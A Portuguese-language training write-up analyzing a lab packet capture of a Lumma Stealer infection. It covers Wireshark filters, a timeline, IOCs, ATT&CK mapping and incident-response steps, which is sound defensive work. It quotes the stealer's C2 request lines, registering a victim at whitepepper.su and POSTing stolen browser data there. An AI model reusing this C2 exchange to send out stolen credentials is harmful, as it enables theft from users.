**Análise de Tráfego de Rede — Lumma Stealer**
**Exercício:** malware-traffic-analysis.net — 2026-01-31  
**Ferramenta utilizada:** Wireshark  
**Autor:** Felipe Esquivel

---

## Sumário

Uma estação de trabalho Windows conectada ao domínio `win11office.com` foi infectada com o **Lumma Stealer**, um malware do tipo infostealer projetado para roubar credenciais, cookies de sessão e dados de navegadores. O host infectado estabeleceu comunicação com o servidor de C2 `whitepepper.su` (IP `153.92.1.49`) na porta 80 via HTTP simples, enviando dados de fingerprinting do sistema. Em seguida, foram identificadas conexões HTTPS com dois domínios adicionais suspeitos, indicando possível instalação de malware secundário.

---

## Ambiente

| Campo | Valor |
|---|---|
| Faixa de IPs da rede local | 10.1.21.0/24 |
| Domínio Active Directory | win11office.com |
| Nome do ambiente AD | WIN11OFFICE |
| Controlador de domínio | 10.1.21.2 — WIN-LU4L24X3UB7 |
| Gateway da rede | 10.1.21.1 |

---

## Detalhes da Vítima

| Campo | Valor |
|---|---|
| Endereço IP | 10.1.21.58 |
| Endereço MAC | 00:21:5d:c8:0e:f2 |
| Nome do host | DESKTOP-ES9F3ML |
| Usuário do Windows | gwyatt |
| Nome completo do usuário | Gabriel Wyatt |

### Como cada informação foi encontrada no Wireshark

- **IP da vítima** — identificado filtrando o tráfego em direção a `153.92.1.49` (IP do C2), usando o filtro `ip.addr == 153.92.1.49`
- **Nome do host** — encontrado com o filtro `nbns`, observando os pacotes de registro de nome NetBIOS
- **Endereço MAC** — visível no campo `Ethernet II > Src` ao clicar em qualquer pacote originado de `10.1.21.58` com o filtro `nbns` ativo
- **Usuário** — encontrado com o filtro `kerberos.CNameString`, expandindo os detalhes do pacote e localizando o campo `CNameString: gwyatt`
- **Nome completo** — encontrado via `Edit → Find Packet`, buscando a string `Wyatt` nos detalhes do pacote, onde aparece o campo `Full Name: Gabriel Wyatt` em tráfego LDAP/SAMR

---

## Linha do Tempo da Infecção

| Horário (UTC) | Evento |
|---|---|
| 23:04:03 | Início da captura — tráfego normal de inicialização do Windows |
| 23:04:49 | Acesso a `media.megafilehub4.lat` — provável origem do malware |
| 23:05:34 | Contato com `whooptm.cyou` — possível redirecionador |
| 23:05:36 | **Primeira conexão com `whitepepper.su`** — início da atividade do Lumma Stealer |
| 23:05:39 | GET `/api/set_agent` com `agent=Chrome` — registro da vítima no painel C2 |
| 23:05:40 | POST `/api/set_agent?act=log` — envio de dados roubados do Chrome (8.023 bytes) |
| 23:05:47 | GET `/api/set_agent` com `agent=Edge` — coleta de dados do Edge |
| 23:05:47 | POST `/api/set_agent?act=log` — envio de dados roubados do Edge (7.975 bytes) |
| 23:06:06 | Conexão HTTPS com `holiday-forever.cc` — malware secundário |
| 23:06:10 | Conexão HTTPS com `communicationfirewall-security.cc` — malware secundário |

---

## Análise do Tráfego Malicioso

### Lumma Stealer — whitepepper.su

O Lumma Stealer é um infostealer vendido como MaaS (Malware-as-a-Service) em fóruns clandestinos. Ele rouba credenciais salvas, cookies, histórico e dados de carteiras de criptomoeda de navegadores como Chrome e Edge.

O fluxo de comunicação observado seguiu o padrão clássico desse malware:

**1. Registro da vítima no painel C2:**
```
GET /api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C
                  &token=842e2802df0f0a06b4ed51f12f4387e761523b
                  &description=
                  &agent=Chrome
Host: whitepepper.su
```

Cada campo tem uma função específica:

| Campo | Valor | Significado |
|---|---|---|
| `id` | `3BF67EC05320C5729578BE4C0ADF174C` | Identificador único da máquina infectada |
| `token` | `842e2802...` | Token de autenticação da vítima no painel C2 |
| `description` | (vazio) | Campo de rótulo deixado em branco |
| `agent` | `Chrome` / `Edge` | Navegador sendo coletado |

**2. Exfiltração dos dados roubados:**
```
POST /api/set_agent?...&act=log
Content-Type: application/x-www-form-urlencoded
Content-Length: 8023
```

O malware repetiu esse ciclo duas vezes — uma para o Chrome e outra para o Edge — enviando respectivamente 8.023 e 7.975 bytes de dados roubados ao servidor C2.

**Domínio suspeito que antecedeu a infecção:**
Antes do contato com `whitepepper.su`, o host acessou `media.megafilehub4.lat` — um domínio com TLD `.lat` sem relação com nenhum serviço legítimo conhecido, provavelmente o vetor de entrega do malware.

---

### Malware Secundário — Domínios .cc

Após a exfiltração via Lumma Stealer, o host estabeleceu conexões HTTPS com dois domínios adicionais:

| Domínio | IP | Porta |
|---|---|---|
| `holiday-forever.cc` | 80.97.160.24 | 443 |
| `communicationfirewall-security.cc` | 104.21.9.36 | 443 |

O TLD `.cc` (Ilhas Cocos) é frequentemente abusado por agentes de ameaça. O nome `communicationfirewall-security.cc` tenta imitar um serviço legítimo de segurança — técnica conhecida como **typosquatting/mascaramento de nome**. Esses domínios indicam a instalação de um payload de segunda etapa, possivelmente um RAT ou outro stealer.

---

## Indicadores de Comprometimento (IOCs)

| Tipo | Valor | Contexto |
|---|---|---|
| IP | `153.92.1.49` | Servidor C2 do Lumma Stealer |
| Domínio | `whitepepper.su` | C2 principal — painel do Lumma Stealer |
| URL | `http://whitepepper.su/api/set_agent` | Endpoint de registro e exfiltração |
| Domínio | `holiday-forever.cc` | Malware secundário (etapa 2) |
| Domínio | `communicationfirewall-security.cc` | Malware secundário (etapa 2) |
| Domínio | `media.megafilehub4.lat` | Provável vetor de entrega |
| Domínio | `whooptm.cyou` | Possível redirecionador |
| ID da vítima | `3BF67EC05320C5729578BE4C0ADF174C` | Identificador único no painel C2 |
| Token | `842e2802df0f0a06b4ed51f12f4387e761523b` | Token de autenticação C2 |

---

## Mapeamento MITRE ATT&CK

| Técnica | ID | Evidência |
|---|---|---|
| Credenciais de navegadores | T1555.003 | Dados de Chrome e Edge enviados ao C2 |
| Exfiltração via protocolo web | T1041 | Dados roubados enviados via HTTP POST |
| Protocolo de camada de aplicação — Web | T1071.001 | C2 operando via HTTP na porta 80 |
| Mascaramento de nome | T1036 | `communicationfirewall-security.cc` imitando serviço legítimo |
| Malware como serviço | T1588 | Lumma Stealer vendido como MaaS |
| Coleta de dados do sistema | T1082 | Fingerprinting da máquina via `/api/set_agent` |

---

## O Que Não Foi Observado

- Nenhum movimento lateral via SMB — a infecção parece limitada ao host `10.1.21.58`
- Nenhuma comunicação com outros hosts internos além do controlador de domínio (tráfego AD normal)
- O vetor de entrega exato (e-mail de phishing, download drive-by) não é confirmável apenas pela captura de rede

---

## Recomendações para Resposta ao Incidente

1. **Isolar imediatamente** o host `DESKTOP-ES9F3ML` (10.1.21.58) da rede
2. **Bloquear no firewall** os IPs e domínios listados na tabela de IOCs
3. **Forçar a redefinição de senha** do usuário `gwyatt` (Gabriel Wyatt) e revogar sessões ativas
4. **Assumir comprometimento total** de todas as credenciais salvas nos navegadores Chrome e Edge desse usuário — notificar os serviços correspondentes
5. **Investigar `media.megafilehub4.lat`** nos logs de proxy/DNS para identificar outros hosts que possam ter acessado o mesmo domínio
6. **Realizar triagem forense** do host para identificar o payload de segunda etapa instalado via `holiday-forever.cc` e `communicationfirewall-security.cc`
7. **Verificar logs do controlador de domínio** para atividade anômala associada à conta `gwyatt`

---

## Ferramentas Utilizadas

| Ferramenta | Uso |
|---|---|
| Wireshark | Análise principal do PCAP |
| VirusTotal | Verificação de reputação de IPs e domínios |
| AbuseIPDB | Relatórios de abuso comunitário |
| ipinfo.io | Identificação de ASN e geolocalização dos IPs |

---

## Referências

- Exercício original: https://www.malware-traffic-analysis.net/2026/01/31/index.html
- Lumma Stealer — documentação de padrões de tráfego: https://www.malware-traffic-analysis.net/2026/01/01/index.html
- ISC SANS Diary: https://isc.sans.edu/diary/32628/
